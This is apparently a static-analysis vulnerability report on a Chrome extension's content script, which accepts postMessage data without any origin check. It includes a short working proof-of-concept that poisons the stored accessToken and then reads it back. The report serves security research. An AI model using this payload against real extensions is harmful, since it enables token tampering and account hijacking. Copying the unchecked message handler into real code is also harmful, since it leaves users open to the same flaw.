# CoCo Analysis: adahoneonjbcodnbkdngadoffhdekhnf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 11 (6x chrome_storage_sync_set_sink, 4x window_postMessage_sink, 1x chrome_storage_sync_clear_sink)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/adahoneonjbcodnbkdngadoffhdekhnf/opgen_generated_files/cs_0.js
Line 513: addEventListener("message", function (msg) {
Line 514: if (msg.data.messageToBackend) {
Line 518: } else if (msg.data.publicateBrowserExtToken) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/adahoneonjbcodnbkdngadoffhdekhnf/opgen_generated_files/cs_0.js
Line 519-523: chrome.storage.sync.set({accessToken: msg.data.publicateBrowserExtToken, token_exp: msg.data.expires}, ...)

**Code:**

```javascript
// Content script - extensionInjector_save.js (cs_0.js, cs_1.js, cs_2.js)
addEventListener("message", function (msg) {
  if (msg.data.messageToBackend) {
    // send a message to the backend script
    chrome.extension.sendMessage(msg.data.messageToBackend);
  } else if (msg.data.publicateBrowserExtToken) {
    // ← Attacker-controlled storage write
    chrome.storage.sync.set(
      {
        accessToken: msg.data.publicateBrowserExtToken, // ← attacker-controlled
        token_exp: msg.data.expires, // ← attacker-controlled
      },
      function (d) {
        oauthWindow.close();
      }
    );
  } else if (msg.data.storeGet) {
    // get something from the local storage
    if (msg.data.storeGet == "accessToken") {
      chrome.storage.sync.get(["token_exp"], function (data) {
        const token_exp = data.token_exp;
        if (!token_exp) {
          // No token
        } else if (Number(token_exp) < new Date().getTime()) {
          console.log("Token has expired!");
        } else {
          chrome.storage.sync.get(["accessToken"], function (data) {
            // ← Storage read - retrieves attacker-controlled data
            postMessage({ storeData: data }, "*"); // ← Sends back to webpage via postMessage
          });
        }
      });
    }
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (window.addEventListener("message"))

**Attack:**

```javascript
// From a malicious webpage where the extension's content script is injected
// The extension runs on all pages: manifest has "matches": ["*://*/*"]

// Step 1: Poison storage with malicious access token
window.postMessage({
  publicateBrowserExtToken: "malicious_token_12345",
  expires: "9999999999999" // Far future expiry
}, "*");

// Step 2: Trigger retrieval to get the poisoned token back
window.postMessage({
  storeGet: "accessToken"
}, "*");

// Step 3: Receive the poisoned token
window.addEventListener("message", function(event) {
  if (event.data.storeData) {
    console.log("Retrieved poisoned token:", event.data.storeData.accessToken);
    // Attacker now has confirmed the poisoning worked
    // Could use this to hijack user's Publicate account or intercept legitimate tokens
  }
});
```

**Impact:** Complete storage exploitation chain. An attacker on any webpage can poison the extension's chrome.storage.sync with a malicious accessToken and retrieve it back via postMessage. This allows the attacker to:
1. Replace legitimate authentication tokens with malicious ones
2. Retrieve and exfiltrate stored tokens
3. Potentially hijack the user's Publicate account
4. Intercept legitimate OAuth tokens when the user authenticates

The vulnerability exists because:
- The extension uses window.postMessage without origin validation
- Content scripts run on all pages ("*://*/*")
- Storage write and read operations are both accessible via postMessage
- Retrieved data flows back to the attacker via postMessage

This is a classic storage poisoning + retrieval vulnerability pattern, creating a complete exploitable chain as required by the methodology.

---

## Sink 2: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/adahoneonjbcodnbkdngadoffhdekhnf/opgen_generated_files/cs_0.js
Line 394-395: var storage_sync_get_source = {'key': 'value'};

**Classification:** TRUE POSITIVE

**Reason:** This sink represents the retrieval side of the storage exploitation chain documented in Sink 1. Data stored via chrome.storage.sync.set (which can be poisoned by an attacker) is retrieved via chrome.storage.sync.get and then sent back to the webpage using window.postMessage, completing the attack chain. Both the write (Sink 1) and read (Sink 2) paths exist, making this a complete exploitable vulnerability.
